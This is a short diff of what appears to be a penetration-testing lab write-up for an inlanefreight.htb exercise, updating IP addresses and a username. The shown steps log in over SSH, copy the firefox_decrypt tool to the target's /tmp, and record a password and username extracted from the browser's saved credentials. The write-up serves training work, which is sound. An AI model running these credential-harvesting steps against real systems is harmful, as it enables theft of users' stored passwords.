@@ -181,12 +181,12 @@ L0vey0u1!
 
 SSH
 ```go
-ssh kira@10.129.239.159
+ssh kira@10.129.218.247
 ```
 
 Transfer LaZagne to Kira
 ```go
-scp -r firefox_decrypt-1.1.1.zip kira@10.129.239.159:/tmp
+scp -r firefox_decrypt-1.1.1.zip kira@10.129.218.247:/tmp
 ```
 
 Executed firefox decrypt on Kira's machine:
@@ -194,12 +194,12 @@ Executed firefox decrypt on Kira's machine:
 
 Password:
 ```go
- TUqr7QfLTLhruhVbCP
+TUqr7QfLTLhruhVbCP
 ```
 
 Username:
 ```go
-wwill@inlanefreight.htb
+will@inlanefreight.htb
 ```
 
 Website:
